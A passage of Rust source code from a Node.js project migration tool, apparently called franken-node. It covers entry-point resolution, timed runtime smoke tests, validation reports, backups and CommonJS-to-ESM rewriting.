                MAX_FINDINGS_PER_CATEGORY,
            );
        }
    }
    if let Some(entry_path) = manifest.get("exports").and_then(serde_json::Value::as_str)
        && !entry_path.trim().is_empty()
    {
        push_bounded(
            &mut candidates,
            ("exports".to_string(), entry_path.to_string()),
            MAX_FINDINGS_PER_CATEGORY,
        );
    }
    match manifest.get("bin") {
        Some(serde_json::Value::String(entry_path)) if !entry_path.trim().is_empty() => {
            push_bounded(
                &mut candidates,
                ("bin".to_string(), entry_path.to_string()),
                MAX_FINDINGS_PER_CATEGORY,
            );
        }
        Some(serde_json::Value::Object(entries)) => {
            for (name, value) in entries {
                if let Some(entry_path) = value.as_str()
                    && !entry_path.trim().is_empty()
                {
                    push_bounded(
                        &mut candidates,
                        (format!("bin.{name}"), entry_path.to_string()),
                        MAX_FINDINGS_PER_CATEGORY,
                    );
                }
            }
        }
        _ => {}
    }
    candidates
}

fn preferred_script_entry_candidates(
    manifest: &serde_json::Value,
) -> Vec<(String, PackageScriptRewrite)> {
    let rewrites = collect_package_script_rewrites(manifest);
    let mut candidates = Vec::new();
    for preferred in ["smoke", "validate", "test", "start"] {
        if let Some(script_rewrite) = rewrites
            .iter()
            .find(|rewrite| rewrite.script_name == preferred)
            .cloned()
        {
            push_bounded(
                &mut candidates,
                (preferred.to_string(), script_rewrite),
                MAX_FINDINGS_PER_CATEGORY,
            );
        }
    }
    for script_rewrite in rewrites {
        if candidates
            .iter()
            .any(|(_, existing)| existing.script_name == script_rewrite.script_name)
        {
            continue;
        }
        let script_name = script_rewrite.script_name.clone();
        push_bounded(
            &mut candidates,
            (script_name, script_rewrite),
            MAX_FINDINGS_PER_CATEGORY,
        );
    }
    candidates
}

fn build_runtime_smoke_target(
    project_root: &Path,
    manifest_dir: &Path,
    manifest_display: &str,
    label: &str,
    entry_path: &str,
) -> Option<MigrationRuntimeSmokeTarget> {
    let entry_path = resolve_runtime_smoke_entry_path(project_root, manifest_dir, entry_path)?;
    let entry_display = relative_display(project_root, &entry_path);
    Some(MigrationRuntimeSmokeTarget {
        working_dir: manifest_dir.to_path_buf(),
        entry_path,
        display: format!("{manifest_display}:{label} -> {entry_display}"),
    })
}

fn resolve_runtime_smoke_entry_path(
    project_root: &Path,
    manifest_dir: &Path,
    entry_path: &str,
) -> Option<PathBuf> {
    let entry_path = entry_path.trim();
    let entry = Path::new(entry_path);
    if entry_path.is_empty() || entry.is_absolute() {
        return None;
    }

    let candidate = manifest_dir.join(entry);
    if let Some(path) = resolve_existing_graph_file(project_root, &candidate) {
        return Some(path);
    }

    for candidate in [
        candidate.with_extension("js"),
        candidate.with_extension("mjs"),
        candidate.with_extension("cjs"),
        candidate.join("index.js"),
        candidate.join("index.mjs"),
        candidate.join("index.cjs"),
    ] {
        if let Some(path) = resolve_existing_graph_file(project_root, &candidate) {
            return Some(path);
        }
    }

    None
}

fn select_smoke_package_manifest(project_path: &Path) -> anyhow::Result<PathBuf> {
    let root_manifest = project_path.join("package.json");
    if root_manifest.is_file() {
        return Ok(root_manifest);
    }

    collect_project_files(project_path)?
        .into_iter()
        .find(|path| {
            path.file_name()
                .and_then(std::ffi::OsStr::to_str)
                .is_some_and(|name| name == "package.json")
        })
        .ok_or_else(|| {
            anyhow::anyhow!(
                "no package.json found for transformed-runtime smoke validation under {}",
                project_path.display()
            )
        })
}

fn resolve_migration_runtime_targets() -> anyhow::Result<Vec<MigrationRuntimeTarget>> {
    let mut runtimes = Vec::new();

    if let Ok(exe_path) = std::env::current_exe()
        && is_franken_node_binary(&exe_path)
    {
        runtimes.push(MigrationRuntimeTarget::FrankenNode(exe_path));
    }

    if let Ok(path) = which::which("node") {
        runtimes.push(MigrationRuntimeTarget::Node(path));
    }
    if let Ok(path) = which::which("bun") {
        runtimes.push(MigrationRuntimeTarget::Bun(path));
    }

    if runtimes.is_empty() {
        anyhow::bail!(
            "no transformed-runtime executor found: franken-node, node, and bun are unavailable"
        );
    }

    Ok(runtimes)
}

fn is_franken_node_binary(path: &Path) -> bool {
    path.file_stem()
        .and_then(std::ffi::OsStr::to_str)
        .is_some_and(|name| name == "franken-node")
}

fn run_command_with_timeout(command: &mut Command, timeout: Duration) -> anyhow::Result<Output> {
    command
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    #[cfg(unix)]
    command.process_group(0);

    let mut child = command
        .spawn()
        .map_err(|err| anyhow::anyhow!("failed launching runtime smoke command: {err}"))?;
    let stdout = child
        .stdout
        .take()
        .ok_or_else(|| anyhow::anyhow!("runtime smoke stdout pipe unavailable"))?;
    let stderr = child
        .stderr
        .take()
        .ok_or_else(|| anyhow::anyhow!("runtime smoke stderr pipe unavailable"))?;
    let stdout_reader = spawn_pipe_reader(stdout, "stdout");
    let stderr_reader = spawn_pipe_reader(stderr, "stderr");
    let started = Instant::now();

    loop {
        if let Some(status) = child
            .try_wait()
            .map_err(|err| anyhow::anyhow!("failed polling runtime smoke command: {err}"))?
        {
            let (stdout, stderr) = match collect_runtime_smoke_output(
                stdout_reader,
                stderr_reader,
                MIGRATION_RUNTIME_PIPE_DRAIN_TIMEOUT,
            ) {
                Ok(output) => output,
                Err(err) => {
                    if let Err(term_err) = terminate_runtime_smoke_process_tree(&mut child) {
                        return Err(anyhow::anyhow!(
                            "runtime smoke command exited but output pipes remained open: {err}; \
                            additionally, process termination failed: {term_err}"
                        ));
                    }
                    return Err(anyhow::anyhow!(
                        "runtime smoke command exited but output pipes remained open: {err}"
                    ));
                }
            };
            return Ok(Output {
                status,
                stdout,
                stderr,
            });
        }

        if started.elapsed() >= timeout {
            drop(stdout_reader);
            drop(stderr_reader);

            if let Err(term_err) = terminate_runtime_smoke_process_tree(&mut child) {
                anyhow::bail!(
                    "runtime smoke command timed out after {}ms; additionally, process termination failed: {term_err}",
                    timeout.as_millis()
                );
            }

            anyhow::bail!(
                "runtime smoke command timed out after {}ms",
                timeout.as_millis()
            );
        }

        thread::sleep(Duration::from_millis(25));
    }
}

fn spawn_pipe_reader(
    reader: impl Read + Send + 'static,
    label: &'static str,
) -> RuntimeSmokePipeReader {
    let (sender, receiver) = mpsc::channel();
    thread::spawn(move || {
        let _ = sender.send(read_to_end(reader));
    });
    RuntimeSmokePipeReader { label, receiver }
}

fn read_to_end(mut reader: impl Read) -> io::Result<Vec<u8>> {
    let mut output = Vec::new();
    reader.read_to_end(&mut output)?;
    Ok(output)
}

fn collect_runtime_smoke_output(
    stdout_reader: RuntimeSmokePipeReader,
    stderr_reader: RuntimeSmokePipeReader,
    timeout: Duration,
) -> anyhow::Result<(Vec<u8>, Vec<u8>)> {
    let stdout = collect_pipe_reader(stdout_reader, timeout)?;
    let stderr = collect_pipe_reader(stderr_reader, timeout)?;
    Ok((stdout, stderr))
}

fn collect_pipe_reader(
    reader: RuntimeSmokePipeReader,
    timeout: Duration,
) -> anyhow::Result<Vec<u8>> {
    match reader.receiver.recv_timeout(timeout) {
        Ok(Ok(output)) => Ok(output),
        Ok(Err(err)) => Err(anyhow::anyhow!(
            "failed reading runtime smoke {}: {err}",
            reader.label
        )),
        Err(mpsc::RecvTimeoutError::Timeout) => Err(anyhow::anyhow!(
            "runtime smoke {} pipe did not close within {}ms",
            reader.label,
            timeout.as_millis()
        )),
        Err(mpsc::RecvTimeoutError::Disconnected) => Err(anyhow::anyhow!(
            "runtime smoke {} reader terminated without output",
            reader.label
        )),
    }
}

fn terminate_runtime_smoke_process_tree(child: &mut Child) -> Result<(), anyhow::Error> {
    #[cfg(unix)]
    terminate_runtime_smoke_process_group(child.id())?;

    child.kill().map_err(|err| anyhow::anyhow!("failed to kill runtime smoke process: {err}"))?;
    child.wait().map_err(|err| anyhow::anyhow!("failed to wait for runtime smoke process: {err}"))?;
    Ok(())
}

#[cfg(unix)]
fn terminate_runtime_smoke_process_group(pid: u32) -> Result<(), std::io::Error> {
    signal_runtime_smoke_process_group(pid, "-TERM")?;
    thread::sleep(MIGRATION_RUNTIME_PROCESS_KILL_GRACE);
    signal_runtime_smoke_process_group(pid, "-KILL")?;
    Ok(())
}

#[cfg(unix)]
fn signal_runtime_smoke_process_group(pid: u32, signal: &str) -> Result<(), std::io::Error> {
    let process_group = format!("-{pid}");
    let status = Command::new("kill")
        .arg(signal)
        .arg("--")
        .arg(process_group)
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()?;

    if !status.success() {
        return Err(std::io::Error::new(
            std::io::ErrorKind::Other,
            format!("kill command failed with signal {signal} for process group {pid}: exit code {}",
                status.code().unwrap_or(-1))
        ));
    }
    Ok(())
}

fn verify_franken_node_smoke_receipt_round_trip(output: &Output) -> anyhow::Result<()> {
    let stdout = String::from_utf8_lossy(&output.stdout);
    let output_json: serde_json::Value = serde_json::from_str(&stdout).map_err(|err| {
        anyhow::anyhow!("franken-node smoke stdout was not JSON: {err}; stdout={stdout}")
    })?;
    if output_json
        .get("success")
        .and_then(serde_json::Value::as_bool)
        != Some(true)
    {
        anyhow::bail!("franken-node smoke output did not report success");
    }

    let receipt = output_json
        .get("receipt")
        .ok_or_else(|| anyhow::anyhow!("franken-node smoke output omitted receipt"))?;
    verify_json_round_trip(receipt, "franken-node smoke receipt")?;

    let receipt_path = output_json
        .get("receipt_path")
        .and_then(serde_json::Value::as_str)
        .ok_or_else(|| anyhow::anyhow!("franken-node smoke output omitted receipt_path"))?;
    let persisted = std::fs::read_to_string(receipt_path).map_err(|err| {
        anyhow::anyhow!("failed reading franken-node smoke receipt {receipt_path}: {err}")
    })?;
    let persisted_receipt: serde_json::Value = serde_json::from_str(&persisted).map_err(|err| {
        anyhow::anyhow!("persisted franken-node smoke receipt was not JSON: {err}")
    })?;
    verify_json_round_trip(&persisted_receipt, "persisted franken-node smoke receipt")?;
    if &persisted_receipt != receipt {
        anyhow::bail!("franken-node smoke stdout receipt did not match persisted receipt");
    }
    Ok(())
}

fn verify_runtime_smoke_receipt_round_trip(
    receipt: &MigrationRuntimeSmokeReceipt,
) -> anyhow::Result<()> {
    let encoded = serde_json::to_vec(receipt)
        .map_err(|err| anyhow::anyhow!("failed serializing runtime smoke receipt: {err}"))?;
    let decoded: MigrationRuntimeSmokeReceipt = serde_json::from_slice(&encoded)
        .map_err(|err| anyhow::anyhow!("failed parsing runtime smoke receipt: {err}"))?;
    if decoded != *receipt {
        anyhow::bail!("runtime smoke receipt changed across JSON round-trip");
    }
    Ok(())
}

fn verify_json_round_trip(value: &serde_json::Value, label: &str) -> anyhow::Result<()> {
    let encoded = serde_json::to_vec(value)
        .map_err(|err| anyhow::anyhow!("failed serializing {label}: {err}"))?;
    let decoded: serde_json::Value = serde_json::from_slice(&encoded)
        .map_err(|err| anyhow::anyhow!("failed parsing {label}: {err}"))?;
    if decoded != *value {
        anyhow::bail!("{label} changed across JSON round-trip");
    }
    Ok(())
}

fn migration_runtime_smoke_output_sha256_hex(stream_field: &'static [u8], bytes: &[u8]) -> String {
    let mut hasher = Sha256::new();
    hasher.update(MIGRATION_RUNTIME_SMOKE_OUTPUT_HASH_DOMAIN);
    update_sha256_len_prefixed(&mut hasher, stream_field);
    update_sha256_len_prefixed(&mut hasher, bytes);
    hex::encode(hasher.finalize())
}

#[must_use]
pub fn migration_runtime_smoke_stdout_sha256_hex(bytes: &[u8]) -> String {
    migration_runtime_smoke_output_sha256_hex(MIGRATION_RUNTIME_SMOKE_STDOUT_FIELD, bytes)
}

#[must_use]
pub fn migration_runtime_smoke_stderr_sha256_hex(bytes: &[u8]) -> String {
    migration_runtime_smoke_output_sha256_hex(MIGRATION_RUNTIME_SMOKE_STDERR_FIELD, bytes)
}

fn update_sha256_len_prefixed(hasher: &mut Sha256, bytes: &[u8]) {
    let len = u64::try_from(bytes.len()).unwrap_or(u64::MAX);
    hasher.update(len.to_le_bytes());
    hasher.update(bytes);
}

pub fn run_validate(project_path: &Path) -> anyhow::Result<MigrationValidateReport> {
    let audit = run_audit(project_path)?;

    let blocking_findings = audit
        .findings
        .iter()
        .filter(|finding| matches!(finding.severity, MigrationSeverity::High))
        .cloned()
        .collect::<Vec<_>>();
    let warning_findings = audit
        .findings
        .iter()
        .filter(|finding| matches!(finding.severity, MigrationSeverity::Medium))
        .cloned()
        .collect::<Vec<_>>();

    let mut checks = Vec::new();
    checks.push(MigrationValidationCheck {
        id: "mig-validate-001".to_string(),
        passed: audit.summary.package_manifests > 0,
        message: format!(
            "package manifests detected: {}",
            audit.summary.package_manifests
        ),
        remediation: Some(
            "Ensure at least one package.json is present before validation.".to_string(),
        ),
    });
    checks.push(MigrationValidationCheck {
        id: "mig-validate-002".to_string(),
        passed: !audit.summary.lockfiles.is_empty(),
        message: format!("lockfiles detected: {}", audit.summary.lockfiles.len()),
        remediation: Some(
            "Commit a lockfile (package-lock.json, pnpm-lock.yaml, yarn.lock, or bun.lockb)."
                .to_string(),
        ),
    });
    checks.push(MigrationValidationCheck {
        id: "mig-validate-003".to_string(),
        passed: audit.summary.risky_scripts == 0,
        message: format!(
            "risky install/build scripts: {}",
            audit.summary.risky_scripts
        ),
        remediation: Some(
            "Remove or harden risky install/build hooks before migration rollout.".to_string(),
        ),
    });
    checks.push(MigrationValidationCheck {
        id: "mig-validate-004".to_string(),
        passed: blocking_findings.is_empty(),
        message: format!("high-severity audit findings: {}", blocking_findings.len()),
        remediation: Some(
            "Resolve all high-severity migrate audit findings before validation can pass."
                .to_string(),
        ),
    });
    if checks.iter().all(|check| check.passed) {
        checks.push(runtime_smoke_validation_check(project_path));
    } else {
        checks.push(runtime_smoke_prerequisite_failure_check());
    }

    let status = if checks.iter().all(|check| check.passed) {
        MigrationValidateStatus::Pass
    } else {
        MigrationValidateStatus::Fail
    };

    Ok(MigrationValidateReport {
        schema_version: "1.0.0".to_string(),
        project_path: project_path.to_string_lossy().replace('\\', "/"),
        generated_at_utc: chrono::Utc::now().to_rfc3339(),
        status,
        checks,
        blocking_findings,
        warning_findings,
    })
}

#[must_use]
pub fn render_validate_report(report: &MigrationValidateReport) -> String {
    let mut output = String::new();
    let _ = writeln!(&mut output, "franken-node migrate validate");
    let _ = writeln!(&mut output, "target: {}", report.project_path);
    let _ = writeln!(&mut output, "status: {}", report.status.as_str());
    let _ = writeln!(
        &mut output,
        "summary: checks={} blocking_findings={} warning_findings={}",
        report.checks.len(),
        report.blocking_findings.len(),
        report.warning_findings.len()
    );
    let _ = writeln!(&mut output, "checks:");
    for check in &report.checks {
        let _ = writeln!(
            &mut output,
            "- [{}] {} {}",
            check.id,
            if check.passed { "PASS" } else { "FAIL" },
            check.message
        );
        if !check.passed
            && let Some(remediation) = &check.remediation
        {
            let _ = writeln!(&mut output, "  remediation: {remediation}");
        }
    }

    if !report.blocking_findings.is_empty() {
        let _ = writeln!(
            &mut output,
            "blocking findings ({}):",
            report.blocking_findings.len()
        );
        for finding in &report.blocking_findings {
            let _ = writeln!(
                &mut output,
                "- [{}] {}{}",
                finding.id,
                finding.message,
                finding
                    .path
                    .as_ref()
                    .map_or_else(String::new, |path| format!(" (path: {path})"))
            );
        }
    }

    output
}

fn collect_project_files(root: &Path) -> anyhow::Result<Vec<PathBuf>> {
    let mut files = Vec::new();
    let mut pending = vec![root.to_path_buf()];

    while let Some(dir) = pending.pop() {
        let entries = std::fs::read_dir(&dir)
            .map_err(|err| anyhow::anyhow!("failed to read directory {}: {err}", dir.display()))?;

        for entry in entries {
            let entry = entry.map_err(|err| {
                anyhow::anyhow!("failed to read directory entry in {}: {err}", dir.display())
            })?;
            let path = entry.path();
            let file_type = entry.file_type().map_err(|err| {
                anyhow::anyhow!("failed to read file type for {}: {err}", path.display())
            })?;
            if file_type.is_symlink() {
                continue;
            }
            if file_type.is_dir() {
                if should_skip_dir(&path) {
                    continue;
                }
                push_bounded(&mut pending, path, MAX_PENDING_DIRS);
            } else if file_type.is_file() {
                push_bounded(&mut files, path, MAX_PROJECT_FILES);
            }
        }
    }

    files.sort();
    Ok(files)
}

fn should_skip_dir(path: &Path) -> bool {
    path.file_name()
        .and_then(std::ffi::OsStr::to_str)
        .is_some_and(|name| {
            matches!(
                name,
                ".git"
                    | "target"
                    | "node_modules"
                    | ".beads"
                    | ".venv"
                    | ".next"
                    | MIGRATION_BACKUP_DIR
            )
        })
}

fn is_migration_source_file(path: &Path) -> bool {
    path.extension()
        .and_then(std::ffi::OsStr::to_str)
        .is_some_and(|extension| {
            matches!(
                extension.to_ascii_lowercase().as_str(),
                "js" | "cjs" | "mjs" | "jsx" | "ts" | "tsx"
            )
        })
}

fn classify_source_module_format(project_path: &Path, source_path: &Path) -> SourceModuleFormat {
    match source_path
        .extension()
        .and_then(std::ffi::OsStr::to_str)
        .map(str::to_ascii_lowercase)
        .as_deref()
    {
        Some("mjs") => SourceModuleFormat::Esm,
        Some("cjs") => SourceModuleFormat::CommonJs,
        Some("js" | "jsx" | "ts" | "tsx") => {
            if nearest_package_declares_module_type(project_path, source_path) {
                SourceModuleFormat::Esm
            } else {
                SourceModuleFormat::CommonJs
            }
        }
        _ => SourceModuleFormat::CommonJs,
    }
}

fn nearest_package_declares_module_type(project_path: &Path, source_path: &Path) -> bool {
    let project_root = std::fs::canonicalize(project_path).unwrap_or_else(|_| project_path.into());
    let source_path = std::fs::canonicalize(source_path).unwrap_or_else(|_| source_path.into());
    let mut current = source_path.parent();

    while let Some(directory) = current {
        if let Some(is_module) = package_manifest_declares_module_type(directory) {
            return is_module;
        }
        if directory == project_root || !directory.starts_with(&project_root) {
            break;
        }
        current = directory.parent();
    }

    false
}

fn package_manifest_declares_module_type(directory: &Path) -> Option<bool> {
    let manifest_path = directory.join("package.json");
    if !manifest_path.is_file() {
        return None;
    }
    let Ok(raw) = std::fs::read_to_string(manifest_path) else {
        return Some(false);
    };
    let Ok(parsed) = serde_json::from_str::<serde_json::Value>(&raw) else {
        return Some(false);
    };
    Some(
        parsed
            .get("type")
            .and_then(serde_json::Value::as_str)
            .is_some_and(|module_type| module_type.trim() == "module"),
    )
}

fn write_migration_backup(
    project_path: &Path,
    source_path: &Path,
    original_content: &str,
) -> anyhow::Result<PathBuf> {
    let relative_path = source_path.strip_prefix(project_path).map_err(|err| {
        anyhow::anyhow!(
            "failed resolving migration backup path for {}: {err}",
            source_path.display()
        )
    })?;
    let backup_path = project_path.join(MIGRATION_BACKUP_DIR).join(relative_path);
    if let Some(parent) = backup_path.parent() {
        std::fs::create_dir_all(parent).map_err(|err| {
            anyhow::anyhow!(
                "failed creating migration backup directory {}: {err}",
                parent.display()
            )
        })?;
    }

    match std::fs::read_to_string(&backup_path) {
        Ok(existing) if existing == original_content => return Ok(backup_path),
        Ok(_) => {
            anyhow::bail!(
                "refusing to overwrite existing migration backup {} with different content",
                backup_path.display()
            );
        }
        Err(err) if err.kind() == io::ErrorKind::NotFound => {}
        Err(err) => {
            anyhow::bail!(
                "failed reading existing migration backup {}: {err}",
                backup_path.display()
            );
        }
    }

    std::fs::write(&backup_path, original_content.as_bytes()).map_err(|err| {
        anyhow::anyhow!(
            "failed writing migration backup {}: {err}",
            backup_path.display()
        )
    })?;
    Ok(backup_path)
}

struct CommonJsRewrite {
    rewritten_content: String,
    rewrite_count: usize,
    manual_findings: Vec<String>,
}

struct EsmImportRewrite {
    rewritten_content: String,
    rewrite_count: usize,
    manual_findings: Vec<String>,
}

#[derive(Debug, Default)]
struct CommonJsParserAnalysis {
    static_require_declarations: usize,
    dynamic_require_calls: usize,
    create_require_calls: usize,
    dynamic_import_calls: usize,
    commonjs_export_objects: usize,
    risky_commonjs_exports: usize,
}

struct CommonJsLineRewrite {
    replacement_line: Option<String>,
    hoisted_import: Option<String>,
}

fn rewrite_commonjs_requires(source: &str) -> CommonJsRewrite {
    let parser_analysis = analyze_commonjs_with_js_parser(source);
    let has_esm_syntax = source.lines().any(line_has_esm_module_syntax);
    let mut line_rewrites = Vec::new();
    let mut hoisted_imports = Vec::new();
    let mut seen_hoisted_imports = BTreeSet::new();
    let mut rewrite_count = 0_usize;
    let mut risky_requires = 0_usize;
    let mut risky_exports = 0_usize;

    for line in source.split_inclusive('\n') {
        let (body, line_ending) = split_line_ending(line);
        if let Some(rewrite) = rewrite_commonjs_line(body) {
            if let Some(import_line) = rewrite.hoisted_import.as_ref() {
                if seen_hoisted_imports.insert(import_line.clone()) {
                    hoisted_imports.push(import_line.clone());
                }
            }
            line_rewrites.push((rewrite.replacement_line, line_ending.to_string()));
            rewrite_count = rewrite_count.saturating_add(1);
        } else {
            if line_contains_require_call(body) {
                risky_requires = risky_requires.saturating_add(1);
            }
            if line_has_commonjs_export(body) {
                risky_exports = risky_exports.saturating_add(1);
            }
            line_rewrites.push((Some(body.to_string()), line_ending.to_string()));
        }
    }

    let mut manual_findings = BTreeSet::new();
    if has_esm_syntax && (rewrite_count > 0 || risky_requires > 0 || risky_exports > 0) {
        manual_findings.insert(
            "ESM/CJS module mixing detected; automatic require() rewrite skipped".to_string(),
        );
    }
    if let Err(reason) = parser_analysis.as_ref() {
        manual_findings.insert(reason.clone());
    }
    if let Ok(analysis) = parser_analysis.as_ref() {
        if analysis.dynamic_require_calls > 0 {
            manual_findings.insert(format!(
                "dynamic or non-literal require() usage detected in {} place(s); manual migration required",
                analysis.dynamic_require_calls
            ));
        }
        if analysis.create_require_calls > 0 {
            manual_findings.insert(format!(
                "createRequire() usage detected in {} place(s); manual migration required",
                analysis.create_require_calls
            ));
        }
        if analysis.dynamic_import_calls > 0 {
            manual_findings.insert(format!(
                "dynamic import() usage detected in {} place(s); manual migration required",
                analysis.dynamic_import_calls
            ));
        }
        if analysis.risky_commonjs_exports > 0 {
            manual_findings.insert(
                "CommonJS export assignment detected; manual ESM export migration required"
                    .to_string(),
            );
        }
        let parser_rewrite_count = analysis
            .static_require_declarations
            .saturating_add(analysis.commonjs_export_objects);
        if parser_rewrite_count != rewrite_count && parser_rewrite_count > 0 {
            manual_findings.insert(
                "parser-backed CommonJS rewrite coverage mismatch; manual migration required"
                    .to_string(),
            );
        }
    }
    if risky_exports > 0 {
        manual_findings.insert(
            "CommonJS export assignment detected; manual ESM export migration required".to_string(),
        );
    }
    if risky_requires > 0 {
        manual_findings.insert(format!(
            "dynamic or non-literal require() usage detected in {risky_requires} place(s); manual migration required"
        ));
    }

    if !manual_findings.is_empty() || rewrite_count == 0 {
        return CommonJsRewrite {
            rewritten_content: source.to_string(),
            rewrite_count: 0,
            manual_findings: manual_findings.into_iter().collect(),
        };
    }

    let mut rewritten_content = String::with_capacity(source.len());
    let mut body_without_requires = String::with_capacity(source.len());
    for (replacement_line, line_ending) in line_rewrites {
        if let Some(replacement_line) = replacement_line {
            body_without_requires.push_str(&replacement_line);
            body_without_requires.push_str(&line_ending);
        }
    }
    prepend_hoisted_imports(
        &mut rewritten_content,
        &body_without_requires,
        &hoisted_imports,
    );

    CommonJsRewrite {
        rewritten_content,
        rewrite_count,
        manual_findings: Vec::new(),
    }
}

fn rewrite_esm_imports(source: &str) -> EsmImportRewrite {
    let has_esm_syntax = source.lines().any(line_has_esm_module_syntax);
    let has_commonjs_syntax = source
        .lines()
        .any(|line| line_contains_require_call(line) || line_has_commonjs_export(line));
    let mut manual_findings = BTreeSet::new();
    if has_esm_syntax && has_commonjs_syntax {
        manual_findings
            .insert("ESM/CJS module mixing detected; automatic import rewrite skipped".to_string());
    } else if has_commonjs_syntax {
        manual_findings.insert(
            "CommonJS require()/exports found in ESM-classified source; manual migration required"
                .to_string(),
        );
    }

    if !manual_findings.is_empty() {
        return EsmImportRewrite {
            rewritten_content: source.to_string(),
            rewrite_count: 0,
            manual_findings: manual_findings.into_iter().collect(),
        };
    }

    let mut rewritten_content = String::with_capacity(source.len());
    let mut rewrite_count = 0_usize;
    for line in source.split_inclusive('\n') {
        let (body, line_ending) = split_line_ending(line);
        if let Some(rewritten_line) = rewrite_esm_import_line(body) {
            rewritten_content.push_str(&rewritten_line);
            rewrite_count = rewrite_count.saturating_add(1);
        } else {
            rewritten_content.push_str(body);
        }
        rewritten_content.push_str(line_ending);
    }

    if rewrite_count == 0 {
        return EsmImportRewrite {
            rewritten_content: source.to_string(),
            rewrite_count: 0,
            manual_findings: Vec::new(),
        };
    }

    EsmImportRewrite {
        rewritten_content,
        rewrite_count,
        manual_findings: Vec::new(),
    }
}

fn rewrite_esm_import_line(line: &str) -> Option<String> {
    let (code, suffix_comment) = split_js_trailing_line_comment(line);
    let (specifier_start, specifier_end, specifier) = esm_module_specifier_span(code)?;
    let normalized_specifier = normalize_import_specifier(&specifier);
    if normalized_specifier == specifier {
        return None;
    }

    let mut rewritten_line = String::with_capacity(
        code.len()
            .saturating_sub(specifier.len())
            .saturating_add(normalized_specifier.len()),
    );
    rewritten_line.push_str(&code[..specifier_start]);
    rewritten_line.push_str(&normalized_specifier);
    rewritten_line.push_str(&code[specifier_end..]);
    Some(append_js_suffix_comment(rewritten_line, suffix_comment))
}

fn esm_module_specifier_span(code: &str) -> Option<(usize, usize, String)> {
    let leading_whitespace = code.len().saturating_sub(code.trim_start().len());
    let trimmed = &code[leading_whitespace..];
    if is_ignorable_js_line(trimmed) {
        return None;
    }

    if let Some(after_import) = trimmed.strip_prefix("import ") {
        let after_import_offset = leading_whitespace.saturating_add("import ".len());
        let after_import_whitespace = after_import
            .len()
            .saturating_sub(after_import.trim_start().len());
        let side_effect_offset = after_import_offset.saturating_add(after_import_whitespace);
        if after_import
            .trim_start()
            .chars()
            .next()
            .is_some_and(|ch| ch == '"' || ch == '\'')
        {
            return parse_js_string_literal_at(code, side_effect_offset);
        }
        return parse_esm_from_specifier(code, after_import_offset);
    }

    if trimmed.starts_with("export ") {
        return parse_esm_from_specifier(code, leading_whitespace.saturating_add("export ".len()));
    }

    None
}

fn parse_esm_from_specifier(code: &str, search_start: usize) -> Option<(usize, usize, String)> {
    let from_offset = code.get(search_start..)?.rfind(" from ")?;
    let from_start = search_start.saturating_add(from_offset);
    let after_from = from_start.saturating_add(" from ".len());
    let rest = code.get(after_from..)?;
    let whitespace = rest.len().saturating_sub(rest.trim_start().len());
    parse_js_string_literal_at(code, after_from.saturating_add(whitespace))
}

fn parse_js_string_literal_at(code: &str, quote_index: usize) -> Option<(usize, usize, String)> {
    let quote = code.get(quote_index..)?.chars().next()?;
    if quote != '"' && quote != '\'' {
        return None;
    }

    let literal_start = quote_index.saturating_add(quote.len_utf8());
    let mut escaped = false;
    for (relative_index, ch) in code.get(literal_start..)?.char_indices() {
        if escaped {
            return None;
        }
        if ch == '\\' {
            escaped = true;
            continue;
        }
        if ch == quote {
            let literal_end = literal_start.saturating_add(relative_index);
            let specifier = code.get(literal_start..literal_end)?.to_string();
            if specifier.trim().is_empty() {
                return None;
            }
            return Some((literal_start, literal_end, specifier));
        }
    }
    None
}

fn analyze_commonjs_with_js_parser(source: &str) -> Result<CommonJsParserAnalysis, String> {
    let mut parser = JsParser::new();
    let language: Language = tree_sitter_javascript::LANGUAGE.into();
    parser
        .set_language(&language)
        .map_err(|err| format!("JavaScript parser unavailable: {err}"))?;
    let tree = parser
        .parse(source, None)
        .ok_or_else(|| "JavaScript parser produced no syntax tree".to_string())?;
    let root = tree.root_node();
    if root.has_error() {
        return Err("JavaScript parser rejected source; manual migration required".to_string());
    }

    let mut analysis = CommonJsParserAnalysis::default();
    analyze_commonjs_js_node(root, source.as_bytes(), &mut analysis);
    Ok(analysis)
}

fn analyze_commonjs_js_node(node: Node<'_>, source: &[u8], analysis: &mut CommonJsParserAnalysis) {
    match node.kind() {
        "variable_declarator" => analyze_commonjs_variable_declarator(node, source, analysis),
        "call_expression" => analyze_commonjs_call_expression(node, source, analysis),
        "assignment_expression" => analyze_commonjs_assignment(node, source, analysis),
        _ => {}
    }

    let mut cursor = node.walk();
    for child in node.named_children(&mut cursor) {
        analyze_commonjs_js_node(child, source, analysis);
    }
}

fn analyze_commonjs_variable_declarator(
    node: Node<'_>,
    source: &[u8],
    analysis: &mut CommonJsParserAnalysis,
) {
    let Some(name) = node.child_by_field_name("name") else {
        return;
    };
    let Some(value) = node.child_by_field_name("value") else {
        return;
    };
    if value.kind() == "call_expression"
        && is_static_require_call(value, source)
        && matches!(name.kind(), "identifier" | "object_pattern")
    {
        analysis.static_require_declarations =
            analysis.static_require_declarations.saturating_add(1);
    }
}

fn analyze_commonjs_call_expression(
    node: Node<'_>,
    source: &[u8],
    analysis: &mut CommonJsParserAnalysis,
) {
    let Some(function_node) = node.child_by_field_name("function") else {
        return;
    };
    if function_node.kind() == "import" {
        analysis.dynamic_import_calls = analysis.dynamic_import_calls.saturating_add(1);
        return;
    }

    let Some(function_text) = js_node_text(function_node, source) else {
        return;
    };
    if function_text == "require" {
        if !is_static_require_call(node, source) {
            analysis.dynamic_require_calls = analysis.dynamic_require_calls.saturating_add(1);
        }
    } else if function_text == "createRequire" || function_text.ends_with(".createRequire") {
        analysis.create_require_calls = analysis.create_require_calls.saturating_add(1);
    }
}

fn analyze_commonjs_assignment(
    node: Node<'_>,
    source: &[u8],
    analysis: &mut CommonJsParserAnalysis,
) {
    let Some(left) = node.child_by_field_name("left") else {
        return;
    };
    if !is_commonjs_export_target(left, source) {
        return;
    }

    let Some(right) = node.child_by_field_name("right") else {
        analysis.risky_commonjs_exports = analysis.risky_commonjs_exports.saturating_add(1);
        return;
    };
    if is_static_module_exports_member(left, source)
        && is_simple_assignment_operator(left, right, source)
        && right.kind() == "object"
        && is_rewritable_commonjs_export_object(right, source)
    {
        analysis.commonjs_export_objects = analysis.commonjs_export_objects.saturating_add(1);
    } else {
        analysis.risky_commonjs_exports = analysis.risky_commonjs_exports.saturating_add(1);
    }
}

fn is_static_require_call(node: Node<'_>, source: &[u8]) -> bool {
    let Some(function_node) = node.child_by_field_name("function") else {
        return false;
    };
    if !js_node_text_eq(function_node, source, "require") {
        return false;
